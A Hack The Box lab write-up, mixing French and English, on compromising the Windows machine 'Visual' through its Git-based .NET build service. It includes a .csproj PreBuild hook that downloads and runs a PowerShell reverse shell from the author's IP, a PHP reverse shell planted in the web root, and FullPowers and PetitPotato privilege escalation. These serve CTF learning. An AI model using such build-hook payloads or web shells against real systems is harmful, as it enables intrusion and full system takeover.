+++
title = "HTB: Visual"
date = 2024-02-24T19:37:32-06:00
draft = false
toc = true
tags = ['Hack The Box']
categories = ['Writeups']
+++

* Platforme: Hack The Box
* Link: [Visual](https://app.hackthebox.com/machines/Visual)
* Niveau: Moyen
* OS: Windows
---

La cible est une machine Windows de difficulté moyenne avec une application web acceptant les URLs des répertoires Git soumis par les utilisateurs.

Adresse IP cible - `10.10.11.234`

<br>

Mon adresse IP - `10.10.14.222`

## Balayage (Scanning)

```
sudo nmap -sC -sV -oA nmap/Visual 10.10.11.234
```
Je commence avec un scan nmap et j'obtiens quelques informations:
- Un serveur web Apache
- Une machine Windows
- Une application PHP

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-20 19:13 MST
Nmap scan report for 10.10.11.234
Host is up (0.047s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)
|_http-title: Visual - Revolutionizing Visual Studio Builds
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.28 seconds
```

## Enumération

Nous accédons à l'application web en visitant `http://10.10.11.234`. L'application semble être un service permettant à l'utilisateur de soumettre le lien d'un répertoire Git, qui compilera ensuite le projet .NET pour l'utilisateur.

![Visual Webapp](/images/HTB-Visual/Visual-webapp.png)

Je teste la fonctionnalité en envoyant un URL, via Python3.
```
python3 -m http.server
```

Je soumets mon lien `http://10.10.14.222:8000` (Remplacez `10.10.14.222` par votre adresse IP)

![Link-submit1](/images/HTB-Visual/link-submit-Visual-1.png)

Je suis redirigé vers cette page, où l'application tente de compiler mon projet.
![Build attempt](/images/HTB-Visual/Visual-build-attempt.png)

Comme il n'y a pas de projet à cet URL, l'opération échoue mais j'obtiens quelques informations. Cette application recherche un fichier `.sln`.

> Un fichier .sln est un fichier de solution utilisé par Microsoft Visual Studio. Ce fichier sert de conteneur pour un ou plusieurs projets. Il permet d'organiser et de gérer des projets au sein d'un espace de travail unique. Le fichier .sln stocke des informations sur les projets qu'il contient, notamment leurs dépendances, les configurations de construction et les références à des bibliothèques ou ressources externes.

![Build failure](/images/HTB-Visual/Visual-build-failure.png)

Je peux voir les réponses sur mon serveur.

![Get method server](/images/HTB-Visual/python3server-GET-method-1.png)

Je vois un code 404, aucun fichier n'ayant été trouvé à mon URL et `GET /info/refs?service=git-upload-pack HTTP/1.1" 404`. Il semble que l'application utilise le service `git-upload-pack` qui fait partie du protocole Git utilisé pour des opérations telles que le clonage ou la récupération de modifications à partir d'un répertoire. Pour en savoir plus, cliquez [ici](https://git-scm.com/docs/git-upload-pack).

On peut lire sur le site que notre lien doit mener à un projet .NET 6.0 avec un fichier `.sln`.

![Visual support](/images/HTB-Visual/Visual-dotnet-support.png)

## Foothold

Je n'ai jamais utilisé .NET, j'ai donc demandé à ChatGPT de m'aider à créer un projet pour cette technologie.

```
dotnet new sln -n visual
```

Lorsque vous exécutez la commande `dotnet new sln -n visual`, un nouveau fichier de solution nommé `visual.sln` est créé.
![Dotnet new sln](/images/HTB-Visual/dotnet-new-sln.png)

```
dotnet new console -n visual
```

Cette commande crée un nouveau projet d'application nommé `visual`. Ce projet contiendra les fichiers et les configurations nécessaires pour une application console de base écrite en C#.

![Dotnet new console](/images/HTB-Visual/dotnet-new-console.png)

Ajoutons le fichier de projet `visual.csproj` situé dans le répertoire `visual` au fichier de la solution (`visual.sln`).

```
dotnet sln add visual/visual.csproj
```
![Dotnet sln add](/images/HTB-Visual/dotnet-sln-add.png)

> Pour les projets .NET, un fichier `.csproj` est utilisé pour définir et configurer le projet. Il s'agit d'un fichier XML qui contient des métadonnées et des paramètres concernant le projet, tels que ses dépendances, ses paramètres de construction, le cadre cible, etc.


`git init` est utilisé pour initialiser un nouveau répertoire Git.
```
git init
```
![Visual git init](/images/HTB-Visual/visual-git-init.png)

Il nous faut trouver un moyen de servir notre répertoire Git à l'application. J'ai trouvé un excellent article à ce sujet ici, [A Quick and Hacky Way to Serve a Git Repo over HTTP](https://theartofmachinery.com/2016/07/02/git_over_http.html).


Exécutons maintenant les commandes suivantes
```
git add .
git commit -m "Test"
cd .git
git --bare update-server-info
cd ..
```

> Nous devrons les exécuter à chaque fois que nous apporterons des modifications à nos fichiers. Lorsque vous exécutez `git --bare update-server-info`, Git met à jour les fichiers auxiliaires nécessaires pour servir le répertoire via le réseau.

Relancez votre serveur python avec `python3 -m http.server` et soumettez votre URL maintenant que nous avons les bons fichiers.

```
http://10.10.14.222:8000/.git
```
![Visual link submit2](/images/HTB-Visual/url-submission-visual1.png)

<br>

Le processus de compilation est cette fois-ci un succès.

![Visual successful build](/images/HTB-Visual/visual-building-successful.png)

De retour sur notre serveur, nous obtenons des requêtes GET valides.

![Server good requests](/images/HTB-Visual/server-good-requests.png)

Je peux voir que l'application compile les fichiers dans le répertoire git. Nous devons trouver un moyen d'exploiter ce processus. En faisant des recherches, je trouve cette [page de Microsoft](https://learn.microsoft.com/en-us/visualstudio/ide/how-to-specify-build-events-csharp?view=vs-2022) qui explique qu'un "pre-build event" fait référence à un script ou à une commande qui est exécuté avant que le processus de compilation pour le projet ne commence.

Nous pouvons utiliser un événement `PreBuild` dans le fichier `.csproj` pour exécuter des commandes. Essayons d'ajouter un shell inversé (reverse shell).

- Ci-dessous, mon fichier `.csproj` modifié
```
<Project Sdk="Microsoft.NET.Sdk">

  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>net6.0</TargetFramework>
    <ImplicitUsings>enable</ImplicitUsings>
    <Nullable>enable</Nullable>
  </PropertyGroup>

<Target Name="PreBuild" BeforeTargets="PreBuildEvent">
    <Exec Command="powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.222:8000/revshell.ps1')" />
  </Target>

</Project>
```

- Créons un script PowerShell `revshell.ps1` pour obtenir un shell distant. J'ai utilisé ce [nishang shell](https://github.com/K-Scorpio/scripts-collection/blob/main/revshell.ps1) pour le reverse shell. J'ai modifié ce [shell](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1), en changeant le nom de la fonction et en ajoutant le "reverse switch" à la fin.

Je mets en place un listener netcat avec

```
nc -nvlp 9001
```

Nous utilisons encore ces commandes git

```
git add .
git commit -m "Add as a test"
cd .git
git --bare update-server-info
cd ..
```

Si vous avez stoppé votre serveur Python, redémarrez-le (et laissez-le tourner) et re-soumettez votre lien.

Le listener devrait capturer un shell une fois la compilation terminée, nous sommes dans le système!

![nc listener, reverse shell](/images/HTB-Visual/nc-listener-shell.png)

Executer `whoami` nous permet de constater que nous sommes l'utilisateur `enox`.

![whoami command on target](/images/HTB-Visual/target-whoami.png)

Nous pouvons vérifier nos privilèges avec `whoami /priv`.
![privilege on target machine](/images/HTB-Visual/target-priv.png)

Je vais dans le répertoire principal de l'utilisateur avec `cd \Users\enox` et j'utilise `ls` pour voir les différents sous-répertoires.

![directories listing on target](/images/HTB-Visual/target-directories.png)

Je consulte le contenu du répertoire `Desktop` avec `dir Desktop` et je vois le drapeau `user.txt`. Utilisez `cat user.txt` pour examiner son contenu.

![User flag](/images/HTB-Visual/Visual-user-flag.png)

## Mouvement Latéral

Pour trouver les chemins d'escalade de privilèges, utilisons [winPEAS](https://github.com/carlospolop/PEASS-ng/releases/tag/20240223-ab2bb023). Téléchargez WinPEASany.exe et stockez-le dans le dossier que vous utilisez pour votre serveur python.

![winPEAS location](/images/HTB-Visual/winPEAS-location.png)

Transférer le fichier sur le système cible avec `wget`
```
wget http://10.10.14.222:8000/winPEASany.exe -o wpany.exe
```

> Use your IP address and replace the port by the one you are using for your server

Verify that the file is on the target

![winPEAS location on target](/images/HTB-Visual/winPEAS-on-target.png)

You can check the options of the script with `./wpany.exe -h`

![winPEAS options](/images/HTB-Visual/winpeas-options.png)

Run winPEAS with the options you want, Because I want a somewhat thorough enumeration I am using this command
```
./wpany.exe domain systeminfo userinfo processinfo servicesinfo applicationsinfo networkinfo windowscreds browserinfo filesinfo eventsinfo quiet
```

It seems that we have permissions to the directory containing the Apache HTTP Server service

![Apache Server HTTP](/images/HTB-Visual/ApacheServerHTTP.png)

Going through the output you can notice that you have full access to the `xampp` directory (remember this is a PHP application), the same folder storing Apache. 

![xampp directory](/images/HTB-Visual/xampp-permissions.png)

We can attempt to learn more about `ApacheHTTPServer` with
```
Get-CIMInstance -Class Win32_Service -Filter "Name='ApacheHTTPServer'" | Select-Object *
```

This is the output we get, it seems like it runs under `NT AUTHORITY\Local Service`

![Apache HTTP Server service info](/images/HTB-Visual/AppacheHTTPServer-info-1.png)

> "On Windows 10, the UPnP Device Host service is configured to execute without impersonation privileges as the user `NT AUTHORITY\LOCAL SERVICE`...". Basically we can achieve privilege escalation via this account. Read more about it [here](https://itm4n.github.io/localservice-privileges/)

The service runs under `NT AUTHORITY\Local Service` so we need to escalate to that account. Since we have access to the `xampp` directory we can plant a reverse shell there and access it through the web browser. I go to that directory and list its content.

> In PHP applications, the XAMPP folder serves as the root directory for hosting web files (such as HTML, PHP, CSS, JavaScript, images, etc.) and managing server configuration settings.

```
cd C:\Xampp\
ls
```
![xampp directory content](/images/HTB-Visual/xampp-content-1.png)

Notice of the `htdocs` folder.

> In XAMPP, the `htdocs` directory serves as the default web server document root. This means that any files placed within the `htdocs` directory will be accessible through a web browser when the XAMPP server is running.

The application files are here as you can see. We can put a PHP reverse shell in the `htdocs` directory.

![xampp htdocs directory](/images/HTB-Visual/xampp-htdocs.png)

This is the [PHP reverse shell](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php) I used. 

I then run `wget http://10.10.14.222:8000/revshell.php -o rev.php` to get it to the target.

![PHP reverse shell on the target](/images/HTB-Visual/php-reverse-shell-1.png)

Let's setup a netcat listener with 
```
nc -nvlp 8010
```

> Use the port number that you specified in the PHP reverse shell

Go back to the browser and go to `http://<IP address>/rev.php`, come back to your listener and you should have a shell with the user `nt authority\local service`

![nt authority user shell on the target](/images/HTB-Visual/nt-authority-local-service.png)

Check your privileges and you notice that you lack the `ImpersonatePrivilege` needed to get root privileges.

Let's run `whoami /priv` to check our privileges

![nt authority user privileges](/images/HTB-Visual/nt-authority-priv.png)

## Escalade des privilèges

This [blog](https://itm4n.github.io/localservice-privileges/) post gives you the link to a tool used to obtain more privileges. The tool is called [FullPowers](https://github.com/itm4n/FullPowers). Get it on the target machine (Make sure to use the reverse shell with `nt authority\local service`)

> We do not want the executable to be accessible through the browser so we `cd ..` back to the `xampp` directory before downloading our file.

```
wget http://10.10.14.222:8000/FullPowers.exe -o fp.exe
```

I get an error because we currently have a cmd shell and not a PowerShell one.

![nt authority user shell error](/images/HTB-Visual/shell-error-1.png)

Just run `powershell` and rerun the `wget` command again

![nt authority FullPowers dlownload](/images/HTB-Visual/powershell-fullpowers-dl.png)

Now we execute `fp.exe` and we get new privileges! Notice that it downgraded us again to a cmd shell and it also forced us out of the `xampp` folder, so we need to run `powershell` again and `cd C:\xampp`

![nt authority user new privileges](/images/HTB-Visual/nt-authority-new-priv.png)

Now we can use [PetitPotato](https://github.com/wh0amitz/PetitPotato) to achieve privilege escalation by abusing impersonate privileges.

We get it to the target by running

```
wget http://10.10.14.222:8000/PetitPotato.exe -o pp.exe
```
However we get an error

```
wget : Win32 internal error "Access is denied" 0x5 occurred while reading the console output buffer. Contact Microsoft 
```

It seems that this error is caused by the progress bar displayed on the terminal. It can be solved by running `$ProgressPreference = "SilentlyContinue"` before the `wget` command.

We can now use our file by running

```
./pp.exe 3 cmd
```
![PetitPotato exploit](/images/HTB-Visual/PetitPotato-exploit.png)

We now have admin privilegs, let's check.

```
cd C:\Users\Administrator\Desktop
```

Then let's list the content of the directory, we got downgraded to a cmd shell again so we have to use `dir` .

![root flag](/images/HTB-Visual/root-flag.png)

We find the `root.txt`! Use `type root.txt` to see it.


